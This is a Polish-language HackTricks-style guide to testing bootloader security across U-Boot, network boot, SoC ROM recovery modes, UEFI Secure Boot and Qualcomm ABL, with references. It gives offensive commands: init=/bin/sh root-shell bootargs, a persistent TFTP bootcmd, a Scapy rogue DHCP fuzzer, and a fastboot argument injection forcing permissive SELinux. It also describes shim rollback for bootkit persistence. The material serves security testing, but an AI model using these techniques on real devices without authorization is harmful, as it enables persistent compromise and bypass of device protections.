# Testowanie bootloadera

{{#include ../../banners/hacktricks-training.md}}

Poniższe kroki są zalecane przy modyfikowaniu konfiguracji uruchamiania urządzenia i testowaniu bootloaderów, takich jak U-Boot i loadery klasy UEFI. Skup się na uzyskaniu wczesnego wykonania kodu, ocenie zabezpieczeń podpisu i ochrony przed rollbackiem oraz wykorzystaniu ścieżek odzyskiwania lub uruchamiania przez sieć.

Powiązane: obejście secure boot w MediaTek przez patchowanie bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Szybkie triki w U-Boot i nadużywanie środowiska

1. Uzyskaj dostęp do powłoki interpretera
   - Podczas uruchamiania naciśnij znany klawisz przerywający (często dowolny klawisz, 0, spacja lub specyficzna dla płyty „magiczna” sekwencja), zanim wykona się `bootcmd`, aby przejść do wiersza poleceń U-Boot.<sup>[[1]](#references)</sup>

2. Sprawdź stan uruchamiania i zmienne
   - Przydatne polecenia:
     - `printenv` (wyświetlenie środowiska)
     - `bdinfo` (informacje o płycie, adresy pamięci)
     - `help bootm; help booti; help bootz` (obsługiwane metody uruchamiania jądra)
     - `help ext4load; help fatload; help tftpboot` (dostępne loadery)

3. Zmodyfikuj argumenty uruchamiania, aby uzyskać powłokę roota
   - Dodaj `init=/bin/sh`, aby jądro uruchomiło powłokę zamiast standardowego procesu init:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Uruchom przez sieć z serwera TFTP
   - Skonfiguruj sieć i pobierz z sieci LAN obraz jądra/FIT:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Utrwal zmiany za pomocą środowiska
   - Jeśli pamięć środowiska nie jest chroniona przed zapisem, możesz utrwalić kontrolę:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Sprawdź zmienne takie jak `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, które wpływają na ścieżki awaryjne. Nieprawidłowo skonfigurowane wartości mogą umożliwić wielokrotne uzyskanie dostępu do powłoki.

6. Sprawdź funkcje debugowania i niebezpieczne funkcje
   - Sprawdź, czy występują: `bootdelay` > 0, wyłączone `autoboot`, nieograniczone `usb start; fatload usb 0:1 ...`, możliwość użycia `loady`/`loads` przez port szeregowy, `env import` z niezaufanych nośników oraz kernele/ramdyski ładowane bez weryfikacji podpisu.

7. Testowanie obrazów i weryfikacji U-Boot
   - Jeśli platforma deklaruje bezpieczny/zweryfikowany rozruch z użyciem obrazów FIT, przetestuj zarówno obrazy niepodpisane, jak i zmodyfikowane:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Brak `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` lub starsze zachowanie `verify=n` często pozwala na uruchomienie dowolnych payloadów.
   - Nie poprzestawaj na prostym wyniku zezwól/odmów: najnowsze badania nad FIT wykazały, że sama ścieżka weryfikacji może być powierzchnią ataku pre-auth. Testuj negatywnie zewnętrznie przechowywane dane FIT (`data-offset`, `data-position`, `data-size`), wybór podpisanej konfiguracji, `loadables` oraz obsługę overlay / `extra-conf`.
   - Jeśli masz odpowiadające temu drzewo źródłowe, `test/vboot/vboot_test.sh` to szybki sposób na odtworzenie zachowania weryfikacji FIT w U-Boot sandbox przed pracą na rzeczywistym sprzęcie.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` i przepływy rozruchowe skryptów
   - W nowoczesnych kompilacjach U-Boot `bootcmd` jest często jedynie opakowaniem Standard Boot. Oznacza to, że zapisywalne nośniki, PXE lub pamięć flash SPI mogą stanowić rzeczywistą granicę zaufania, nawet jeśli widoczne środowisko wygląda nieszkodliwie.
   - `extlinux` bootmeth wyszukuje `extlinux/extlinux.conf` w katalogach `/` i `/boot`; script bootmeth najpierw wyszukuje `boot.scr.uimg`, a następnie `boot.scr`. Przy rozruchu sieciowym nazwa pliku skryptu może pochodzić z `boot_script_dhcp`.
   - Przydatne polecenia do wstępnej analizy:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Przypadki nadużyć do przetestowania: kontrolowane przez atakującego nośniki USB/SD umieszczone wcześniej w `boot_targets`, zapisywalny plik `/boot/extlinux/extlinux.conf`, nieautoryzowany serwer TFTP dostarczający `boot.scr` lub wykonywanie skryptu z nośnika SPI za pośrednictwem `script_offset_f`.
   - Jeśli platforma polega na weryfikacji FIT, upewnij się, że konfiguracje są podpisane na poziomie konfiguracji, a nie tylko poszczególne obrazy; `required-mode=all` jest bezpieczniejsze niż akceptowanie dowolnego pojedynczego wymaganego klucza.

## Powierzchnia rozruchu sieciowego (DHCP/PXE) i nieautoryzowane serwery

9. Fuzzing parametrów PXE/DHCP
   - Obsługa starszego BOOTP/DHCP w U-Boot miała problemy z bezpieczeństwem pamięci. Na przykład CVE‑2024‑42040 opisuje ujawnienie pamięci za pośrednictwem spreparowanych odpowiedzi DHCP, które mogą wyciekać bajty z pamięci U-Boot do sieci.<sup>[[4]](#references)</sup> Testuj ścieżki kodu DHCP/PXE, używając nadmiernie długich wartości i wartości brzegowych (nazwa pliku rozruchowego opcji 67, opcje dostawcy, pola nazwy pliku/serwera), i obserwuj, czy występują zawieszenia lub wycieki.
   - Minimalny fragment Scapy do obciążenia parametrów rozruchowych podczas rozruchu sieciowego:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Sprawdź również, czy pola filename PXE są przekazywane do logiki shell/loader bez sanityzacji, gdy są łączone ze skryptami provisioningu po stronie systemu operacyjnego.

10. Testowanie command injection przez nieautoryzowany serwer DHCP
   - Skonfiguruj nieautoryzowaną usługę DHCP/PXE i spróbuj wstrzyknąć znaki do pól filename lub options, aby dotrzeć do interpreterów poleceń na dalszych etapach łańcucha rozruchowego. Sprawdzą się Metasploit’s DHCP auxiliary, `dnsmasq` lub własne skrypty Scapy. Najpierw odizoluj sieć laboratoryjną.

## Tryby odzyskiwania SoC ROM, które zastępują normalny rozruch

Wiele SoC udostępnia tryb „loader” BootROM, który przyjmuje kod przez USB/UART, nawet gdy obrazy flash są nieprawidłowe. Jeśli bezpieczny rozruch nie jest zablokowany przez bezpieczniki, może to zapewnić wykonanie dowolnego kodu na bardzo wczesnym etapie łańcucha.

- NXP i.MX (Serial Download Mode)
  - Narzędzia: `uuu` (mfgtools3) lub `imx-usb-loader`.
  - Przykład: `imx-usb-loader u-boot.imx` — przesyła i uruchamia własny U-Boot z RAM.
- Allwinner (FEL)
  - Narzędzie: `sunxi-fel`.
  - Przykład: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` lub `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Narzędzie: `rkdeveloptool`.
  - Przykład: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` — przygotowuje loader i przesyła własny U-Boot.

Sprawdź, czy w urządzeniu zaprogramowano bezpieczniki eFuses/OTP secure-boot. Jeśli nie, tryby pobierania BootROM często omijają wszelką weryfikację wyższego poziomu (U-Boot, kernel, rootfs), uruchamiając bezpośrednio payload pierwszego etapu z SRAM/DRAM.

## Szybkie kontrole bootloaderów UEFI/klasy PC

11. Testowanie manipulacji ESP, rollback i rejestracji kluczy
   - Zamontuj EFI System Partition (ESP) i sprawdź, czy znajdują się na niej komponenty loadera: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` oraz ścieżki do logo producenta.
   - Gdy to możliwe, odczytaj stan Secure Boot i bazy kluczy z systemu operacyjnego:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Jeśli platforma działa w trybie Setup Mode, akceptuje rejestrację kluczy bez uwierzytelniania lub jest dostarczana z testowym/domyslnym Platform Key (klasa PKfail), lokalny administrator lub osoba mająca fizyczny dostęp może zarejestrować własne klucze KEK/db i sprawić, że Secure Boot będzie nadal wyglądał na „włączony”, mimo że uruchamiane będą dowolne pliki EFI.<sup>[[3]](#references)</sup>
   - Spróbuj uruchomić system z użyciem podpisanych, ale starszych lub znanych jako podatne na ataki komponentów rozruchowych, jeśli lista unieważnień Secure Boot (dbx) nie jest aktualna. Jeśli platforma nadal ufa starym shimom/menedżerom rozruchu, często można załadować własne jądro lub plik `grub.cfg` z ESP, aby uzyskać trwały dostęp.
   - W systemie Windows załatane hosty mogą nadal akceptować podatne na ataki, podpisane menedżery rozruchu, jeśli podpisującego `Microsoft Windows Production PCA 2011` nie ma w firmware `dbx`, co zaobserwowano w przypadku BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Obejście w stylu Baton Drop może zarejestrować klucz MOK atakującego; podczas kolejnych uruchomień legalny shim może wtedy załadować plik EFI podpisany tym kluczem.<sup>[[12]](#references)[[13]](#references)</sup> Późniejsze unieważnienie starego podpisującego Windows nie usuwa zarejestrowanego klucza MOK, więc ścieżka oparta na shimie może pozostać dostępna, jeśli ten shim nadal jest zaufany.<sup>[[12]](#references)</sup>
   - Przed przetestowaniem tej ścieżki rollbacku na autoryzowanej maszynie UEFI sprawdź **efektywny stan unieważnień firmware**, a nie tylko historię aktualizacji Windows.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft udostępnia tę kontrolę tylko do odczytu w podwyższonym PowerShellu, aby sprawdzić podpisującego z 2011 r. w `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` to jedynie wskazówka: potwierdź konkretny podpisany komponent rozruchowy i inne unieważnienia w laboratorium umożliwiającym odzyskanie systemu.<sup>[[12]](#references)[[14]](#references)</sup> Oczekująca aktualizacja rejestru ani wygasły certyfikat podpisywania nie są równoznaczne z ukończonym unieważnieniem `dbx`.<sup>[[13]](#references)[[14]](#references)</sup>

12. Testowanie nieaktualnych unieważnień shim / SBAT / dbx
   - Stare shimy podpisane przez Microsoft i forki dostawców mogą nadal służyć jako ścieżka do bootkita w stylu BYOVD, jeśli unieważnienia są nieaktualne. W odizolowanym laboratorium umieść historycznie podatny shim na ESP i spróbuj załadować łańcuchowo własny `grubx64.efi` lub kernel.<sup>[[11]](#references)</sup>
   - Szybka ocena:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Jeśli shim nadal działa mimo że znajduje się na liście unieważnień, firmware/OS ma nieaktualne aktualizacje `dbx` albo ufa rozwidlonemu loaderowi, który nigdy nie odziedziczył zabezpieczeń SBAT z upstreamu.

13. Błędy parsowania logo rozruchowego (klasa LogoFAIL)
   - W firmware kilku producentów OEM/IBV występowały błędy parsowania obrazów w DXE, który przetwarza logo rozruchowe. Jeśli atakujący może umieścić spreparowany obraz na ESP w ścieżce specyficznej dla producenta (np. `\EFI\<vendor>\logo\*.bmp`) i ponownie uruchomić urządzenie, możliwe może być wykonanie kodu podczas wczesnego rozruchu, nawet przy włączonym Secure Boot. Sprawdź, czy platforma akceptuje logo dostarczone przez użytkownika oraz czy te ścieżki można zapisywać z poziomu OS.<sup>[[2]](#references)</sup>


## Luki w zaufaniu ABL + GBL na Androidzie/Qualcomm (Android 16)

Na urządzeniach z Androidem 16, które używają ABL firmy Qualcomm do ładowania **Generic Bootloader Library (GBL)**, sprawdź, czy ABL **uwierzytelnia** aplikację UEFI ładowaną z partycji `efisp`. Jeśli ABL sprawdza jedynie **obecność** aplikacji UEFI i nie weryfikuje podpisów, write primitive do `efisp` umożliwia **wykonanie niepodpisanego kodu przed uruchomieniem OS** podczas rozruchu.<sup>[[6]](#references)[[7]](#references)</sup>

Praktyczne kontrole i ścieżki nadużyć:

- **write primitive do efisp**: Potrzebujesz sposobu na zapisanie niestandardowej aplikacji UEFI w `efisp` (root/usługa uprzywilejowana, błąd w aplikacji OEM, ścieżka recovery/fastboot). Bez tego luki w ładowaniu GBL nie da się bezpośrednio wykorzystać.<sup>[[6]](#references)</sup>
- **wstrzykiwanie argumentów fastboot OEM** (błąd ABL): Niektóre kompilacje akceptują dodatkowe tokeny w `fastboot oem set-gpu-preemption` i dopisują je do wiersza poleceń jądra. Można to wykorzystać do wymuszenia permisywnego SELinux, co umożliwia zapis do chronionej partycji:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Jeśli urządzenie jest załatane, polecenie powinno odrzucać dodatkowe argumenty.<sup>[[5]](#references)[[6]](#references)</sup>
- **Odblokowanie bootloadera za pomocą trwałych flag**: Ładunek wykonywany na etapie rozruchu może zmienić trwałe flagi odblokowania (np. `is_unlocked=1`, `is_unlocked_critical=1`), aby naśladować `fastboot oem unlock` bez wymogu przejścia przez bramki serwera OEM/aprobacji. Zmiana tego stanu utrzymuje się po następnym ponownym uruchomieniu.<sup>[[6]](#references)</sup>

Uwagi dotyczące obrony i triage:

- Sprawdź, czy ABL weryfikuje podpis ładunku GBL/UEFI z `efisp`. Jeśli nie, traktuj `efisp` jako obszar wysokiego ryzyka pod kątem utrwalania dostępu.
- Ustal, czy procedury obsługi poleceń fastboot OEM w ABL zostały załatane tak, aby **weryfikowały liczbę argumentów** i odrzucały dodatkowe tokeny.<sup>[[8]](#references)[[9]](#references)</sup>

## Ostrzeżenia dotyczące sprzętu

Zachowaj ostrożność podczas pracy z pamięcią flash SPI/NAND na wczesnym etapie rozruchu (np. podczas uziemiania pinów w celu ominięcia odczytów) i zawsze sprawdzaj dokumentację układu flash. Zwarcia wykonane w niewłaściwym momencie mogą uszkodzić urządzenie lub programator.

## Uwagi i dodatkowe wskazówki

- Wypróbuj `env export -t ${loadaddr}` i `env import -t ${loadaddr}`, aby przenosić bloki środowiska między RAM-em a pamięcią masową; niektóre platformy pozwalają importować środowisko z nośników wymiennych bez uwierzytelniania.
- W systemach opartych na Linuksie, które uruchamiają się przez `extlinux.conf`, modyfikacja wiersza `APPEND` (aby wstrzyknąć `init=/bin/sh` lub `rd.break`) na partycji rozruchowej często wystarcza, jeśli nie są wymuszane kontrole podpisów.
- Jeśli cel korzysta z aktualizacji z podwójnym slotem / A/B, zapoznaj się z technikami obejścia ochrony przed downgrade'em i desynchronizacji slotów w [omówieniu analizy firmware](README.md), aby nie przeoczyć luk w zaufaniu występujących wyłącznie w aktualizatorze, poza samym bootloaderem.
- Jeśli przestrzeń użytkownika udostępnia `fw_printenv/fw_setenv`, sprawdź, czy `/etc/fw_env.config` odpowiada rzeczywistej lokalizacji przechowywania środowiska. Błędnie skonfigurowane przesunięcia mogą powodować odczyt/zapis niewłaściwego obszaru MTD.

## References

- [1] [Metodyka testowania bezpieczeństwa firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Odkrycie LogoFAIL: zagrożenia związane z analizowaniem obrazów podczas rozruchu systemu](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: niezaufane klucze platformy podważają Secure Boot w ekosystemie UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Szczegóły CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: odblokowanie Xiaomi za pomocą dwóch niesanitowanych ciągów znaków](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Exploit GBL w Qualcomm Snapdragon 8 Elite pozwala atakującym odblokowywać bootloadery](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Architektura Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: naprawa propagacji niezaufanych danych wejściowych do wiersza poleceń jądra](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: dodanie kontroli polecenia set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: przełamanie weryfikacji podpisu FIT w U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Informacja o podatności VU#616257 — bootloadery shim UEFI podpisane przez Microsoft są podatne na obejście Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [Bootkit UEFI BlackLotus: mit potwierdzony](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: bootkit UEFI podobny do BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Zarządzanie unieważnieniami Windows Boot Managera na potrzeby zmian Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
